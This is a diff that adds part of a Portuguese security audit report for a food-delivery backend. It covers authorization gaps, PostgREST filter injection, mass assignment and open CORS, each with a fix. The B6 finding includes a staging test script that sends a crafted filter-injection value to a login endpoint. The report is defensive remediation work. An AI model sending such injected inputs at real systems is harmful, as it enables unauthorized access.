+    .select('id, tipo, status, valor, pix_code, pix_qr_url, pagbank_order_id, pago_em, criado_em')
+    .eq('order_id', orderId)
+    .order('criado_em', { ascending: false });
+  if (error) throw error;
+  return { pagamentos: data ?? [] };
+}</code></pre>
+    </article>
+
+    <article class="finding" id="b5">
+      <div class="f-head"><span class="pill alta">Alta</span><span class="pill fixed">Corrigido</span><h3>B5 — Cobrar PIX/cartão em pedido de outro usuário</h3></div>
+      <div class="f-loc"><span class="repo">serer_delivery</span> · src/pagamentos/pagamentos.service.ts:112-169 (criarPix), :171+ (criarCartao)</div>
+      <p><code class="mono">buscarPedido()</code> já retorna <code class="mono">user_id</code>, mas nem <code class="mono">criarPix</code> nem <code class="mono">criarCartao</code> comparam com quem está chamando.</p>
+      <p class="impact"><b>Impacto:</b> um usuário pode iniciar uma cobrança PIX/cartão contra o pedido de outra pessoa — na melhor hipótese gera confusão de estado de pagamento, na pior é abuso do fluxo de cobrança.</p>
+      <div class="f-lead">Correção</div>
+      <pre><code>// controller: passar req.userId pros dois métodos
+criarPix(@Body() body: {...}, @Req() req: any) {
+  return this.service.criarPix(body, req.userId);
+}
+
+// service: checar posse logo após buscarPedido()
+async criarPix(body: {...}, callerUserId: string) {
+  const pedido = await this.buscarPedido(body.order_id);
+  if (pedido.user_id !== callerUserId) {
+    throw new ForbiddenException('Este pedido não pertence a você');
+  }
+  /* resto sem mudança */
+}
+// mesma checagem em criarCartao</code></pre>
+    </article>
+
+    <article class="finding" id="b6">
+      <div class="f-head"><span class="pill alta">Alta</span><h3>B6 — Injeção de filtro PostgREST no login/cadastro do motoboy</h3></div>
+      <div class="f-loc"><span class="repo">serer_delivery</span> · src/motoboy/motoboy-auth.service.ts:115, 151-165</div>
+      <p><code class="mono">identificador</code> (endpoint público, sem autenticação) é interpolado direto em <code class="mono">.or(`email.eq.${'${identificador}'},phone.eq...`)`</code>. PostgREST parseia <code class="mono">.or()</code> como uma mini-DSL separada por vírgula — caracteres como <code class="mono">,</code> <code class="mono">(</code> <code class="mono">)</code> no input podem injetar cláusulas extras no filtro.</p>
+      <p class="impact"><b>Impacto:</b> primitivo de injeção de filtro num endpoint não autenticado — risco de contornar a intenção do filtro de duas cláusulas.</p>
+      <div class="f-lead">Correção</div>
+      <pre><code>// motoboy-auth.service.ts
+const EMAIL_RE = /^[^\s,()]+@[^\s,()]+\.[^\s,()]+$/;
+const PHONE_RE = /^\+?[0-9]{8,15}$/;
+
+async login(identificador: string, password: string) {
+  if (!EMAIL_RE.test(identificador) && !PHONE_RE.test(identificador)) {
+    throw new UnauthorizedException('Credenciais inválidas');
+  }
+  const { data: motoboy } = await this.supabase.client
+    .from('motoboys')
+    .select('id, password_hash, is_active')
+    .or(`email.eq.${'${identificador}'},phone.eq.${'${identificador}'}`)
+    .maybeSingle();
+  /* resto sem mudança */
+}
+
+// cadastro(): mesma validação antes de montar o .or() de duplicidade
+if (body.email && !EMAIL_RE.test(body.email)) throw new BadRequestException('E-mail inválido');
+if (body.phone && !PHONE_RE.test(body.phone)) throw new BadRequestException('Telefone inválido');</code></pre>
+      <div class="f-lead">Script de teste (Staging)</div>
+      <pre><code>import os, requests
+
+STAGING_URL = os.environ["STAGING_URL"]
+
+payload = {"identificador": "x@x.com,phone.eq.),or", "password": "qualquer"}
+r = requests.post(f"{STAGING_URL}/motoboy/auth/login", json=payload, timeout=10)
+print("payload malicioso:", r.status_code, r.text[:200])
+
+control = requests.post(f"{STAGING_URL}/motoboy/auth/login",
+    json={"identificador": "x@x.com", "password": "qualquer"}, timeout=10)
+print("controle:", control.status_code, control.text[:200])
+
+# Se o payload malicioso voltar um erro de parsing do PostgREST (ex.: 500/400
+# mencionando "or"/"filter") em vez do mesmo 401 "credenciais inválidas" do
+# controle, a string está alcançando o filtro sem sanitização.</code></pre>
+    </article>
+
+    <article class="finding" id="b7">
+      <div class="f-head"><span class="pill alta">Alta</span><h3>B7 — Mass assignment em impressoras (troca de tenant / token)</h3></div>
+      <div class="f-loc"><span class="repo">serer_delivery</span> · src/salao/impressoras.service.ts:56-66</div>
+      <p><code class="mono">ImpressoraBody</code> é uma interface TS, não uma classe validada — <code class="mono">atualizar()</code> faz <code class="mono">.update(body)</code> direto, sem whitelist de campos (diferente de <code class="mono">criar()</code>, no mesmo arquivo, que já monta o objeto campo a campo).</p>
+      <p class="impact"><b>Impacto:</b> dono de restaurante autenticado pode incluir <code class="mono">restaurant_id</code> ou <code class="mono">token</code> (segredo que <code class="mono">AgenteImpressaoGuard</code>/<code class="mono">CozinhaGuard</code> confiam) no PATCH e reatribuir a impressora pra outro tenant ou sobrescrever o token de autenticação do agente de impressão.</p>
+      <div class="f-lead">Correção</div>
+      <pre><code>// impressoras.service.ts — mesmo padrão de whitelist já usado em criar()
+async atualizar(id: number, restaurantId: number, body: Partial&lt;ImpressoraBody&gt;) {
+  await this.garantirPertence(id, restaurantId);
+  const campos: Record&lt;string, any&gt; = {};
+  if (body.nome !== undefined) campos.nome = body.nome;
+  if (body.setor !== undefined) campos.setor = body.setor;
+  if (body.tipo_conexao !== undefined) campos.tipo_conexao = body.tipo_conexao;
+  if (body.endereco !== undefined) campos.endereco = body.endereco;
+  if (body.ativo !== undefined) campos.ativo = body.ativo;
+  if (body.nome_sistema !== undefined) campos.nome_sistema = body.nome_sistema;
+
+  const { data, error } = await this.supabase.client
+    .from('impressoras')
+    .update(campos)          // nunca restaurant_id/token vindos do body
+    .eq('id', id)
+    .select()
+    .single();
+  if (error) throw error;
+  return data;
+}</code></pre>
+    </article>
+
+    <article class="finding" id="b8">
+      <div class="f-head"><span class="pill alta">Alta</span><h3>B8 — CORS aberto (<code class="mono">enableCors()</code> sem origem)</h3></div>
+      <div class="f-loc"><span class="repo">serer_delivery</span> · src/main.ts:18</div>
+      <p><code class="mono">app.enableCors()</code> chamado sem opções — o pacote <code class="mono">cors</code> reflete/permite qualquer origem por padrão, em produção também.</p>
+      <p class="impact"><b>Impacto:</b> num modelo com domínio próprio por loja (custom_domain), CORS aberto amplia a superfície de qualquer bug de auth existente — qualquer site pode fazer requisições autenticadas via browser com um token roubado.</p>
+      <div class="f-lead">Correção</div>
+      <pre><code>// main.ts
+const allowedOrigins = (process.env.CORS_ALLOWED_ORIGINS ?? '')
+  .split(',').map((s) => s.trim()).filter(Boolean);
+
+app.enableCors({
+  origin: (origin, callback) => {
+    if (!origin) return callback(null, true); // server-to-server, sem browser
+    if (allowedOrigins.includes(origin)) return callback(null, true);
+    callback(new Error('Origem não autorizada pelo CORS'), false);
+  },
+  credentials: true,
+});</code></pre>
+      <p style="font-size:13.5px;color:var(--ink-soft)">Requer listar os domínios conhecidos em <code class="mono">CORS_ALLOWED_ORIGINS</code> (app principal + cada <code class="mono">custom_domain</code> White Label já cadastrado). Como essa lista cresce por tenant, o próximo passo natural é resolver a allowlist consultando <code class="mono">restaurants.custom_domain</code> em vez de uma env var estática — a mesma tabela que <code class="mono">RestaurantOwnerGuard</code> já consulta.</p>
+    </article>
+  </section>
+
+  <!-- ══════════════════════════════ APÊNDICE ══════════════════════════════ -->
+  <section id="apendice">
+    <h2>Média e Baixa — apêndice</h2>
+    <p class="section-note">Sem exploração encadeada com as críticas acima. Tratamento resumido — correção recomendada sem script de teste dedicado, pra manter o relatório acionável.</p>
+    <div class="table-scroll">
+      <table>
+        <thead><tr><th>#</th><th>Achado</th><th>Sev.</th><th>Recomendação</th></tr></thead>
+        <tbody>
+          <tr class="appendix-row"><td class="id">B9</td><td class="loc">restaurante.service.ts:45 · empresas.service.ts:27</td><td><span class="pill media">Média</span></td><td>Remover <code class="mono">payment_config</code> do <code class="mono">select()</code> de <code class="mono">buscarMinhaEmpresa</code>/<code class="mono">GET /empresas/:id</code> — o token PagBank já tem uma rota própria mascarada (<code class="mono">getConfig()</code>, restaurante.service.ts:824) que existe exatamente pra isso.</td></tr>
+          <tr class="appendix-row"><td class="id">B10</td><td class="loc">produtos, empresas, pagamentos, restaurante…</td><td><span class="pill media">Média</span></td><td>Migrar corpos tipados como <code class="mono">any</code>/interface pra classes DTO com <code class="mono">class-validator</code> (só 2 dos ~15 módulos usam DTO hoje) — sem isso o <code class="mono">ValidationPipe({'{'}whitelist{'}'})</code> global não filtra nada nesses endpoints. B2 e B7 são as duas instâncias com impacto de segurança comprovado; o resto é dívida sistêmica na mesma classe de bug.</td></tr>
+          <tr class="appendix-row"><td class="id">B11</td><td class="loc">motoboy-auth / garcom-auth controllers</td><td><span class="pill media">Média</span></td><td>Adicionar <code class="mono">@nestjs/throttler</code> (não está no <code class="mono">package.json</code>) nos endpoints de login — sem lockout, senha de motoboy/garçom (4-6 caracteres, ver B13) fica exposta a força bruta.</td></tr>
+          <tr class="appendix-row"><td class="id">F2</td><td class="loc">MotoboyGuard.jsx:8 · restaurante-kds-setor/index.jsx:58</td><td><span class="pill media">Média</span></td><td>Token de acesso (motoboy/cozinha) chega via <code class="mono">?token=</code> na URL e é salvo direto no <code class="mono">localStorage</code> sem validação — fica no histórico do navegador e em <code class="mono">Referer</code>. Trocar por um endpoint de "resgate" que troca o token da URL por um novo via POST antes de persistir.</td></tr>
+          <tr class="appendix-row"><td class="id">F3</td><td class="loc">printComanda.js:50,224</td><td><span class="pill media">Média</span></td><td>JsBarcode carregado via <code class="mono">&lt;script src="cdn.jsdelivr.net/..."&gt;</code> sem <code class="mono">integrity</code>. Preferir <code class="mono">npm install jsbarcode</code> e importar localmente — remove a dependência de CDN e o risco de supply chain, mais relevante ainda estando no mesmo documento do XSS em F1.</td></tr>
+          <tr class="appendix-row"><td class="id">B12</td><td class="loc">main.ts</td><td><span class="pill baixa">Baixa</span></td><td><code class="mono">helmet</code> não está nem instalado. <code class="mono">npm i helmet</code> + <code class="mono">app.use(helmet())</code> em <code class="mono">main.ts</code> antes do <code class="mono">listen()</code>.</td></tr>
+          <tr class="appendix-row"><td class="id">B13</td><td class="loc">garcons.service.ts:39 · motoboy-auth.service.ts:169</td><td><span class="pill baixa">Baixa</span></td><td>Mínimo de senha 4 (garçom) e 6 (motoboy) caracteres — subir pra ao menos 8, já que são contas de staff provisionadas pelo dono, não autocadastro público.</td></tr>
+          <tr class="appendix-row"><td class="id">F4</td><td class="loc">deliveryhub_white_label/.env, .env_exemplo</td><td><span class="pill baixa">Baixa</span></td><td>Adicionar <code class="mono">.env</code> ao <code class="mono">.gitignore</code> (hoje versionado). Remover de <code class="mono">.env_exemplo</code> as variáveis que não são <code class="mono">VITE_*</code> (<code class="mono">SUPABASE_SERVICE_ROLE_KEY</code>, <code class="mono">GARCOM_JWT_SECRET</code>) — não fazem sentido num template de frontend e documentam o formato de segredos de backend num repo que não deveria conhecê-los.</td></tr>
+          <tr class="appendix-row"><td class="id">F5</td><td class="loc">src/services/customerService.js:67-135 · orderService.js:112-236</td><td><span class="pill baixa">Baixa</span></td><td>Código morto (não importado por nenhuma página) que consulta <code class="mono">customers</code>/<code class="mono">orders</code> direto do Supabase com a anon key, marcado "Admin only" só em comentário. Remover, ou mover a lógica pro backend NestJS onde há enforcement real — deixar código morto assim é uma arma carregada pra um próximo dev reativar sem perceber o problema.</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <footer>
+    <p><b>Metodologia:</b> varredura de código estática (sem execução contra ambiente real), conduzida por dois agentes de exploração — um por repositório — seguindo o <span class="mono">PENTEST_CODE_REVIEW_PROTOCOL.md</span> do vault <span class="mono">may_memory</span>, com síntese e verificação manual dos achados antes deste relatório. Achados Crítica/Alta tiveram o trecho de código lido diretamente na fonte antes do patch ser escrito.</p>
+    <p><b>Antes de aplicar:</b> os scripts de teste assumem variáveis de ambiente (<span class="mono">STAGING_URL</span>, tokens) e devem rodar <b>só contra Staging</b>, nunca produção. B1–B7 seguem o mesmo padrão de correção (comparar o dono do recurso com quem está chamando) — vale revisar se esse padrão falta em outros endpoints não cobertos aqui.</p>
+  </footer>
+
+</div>
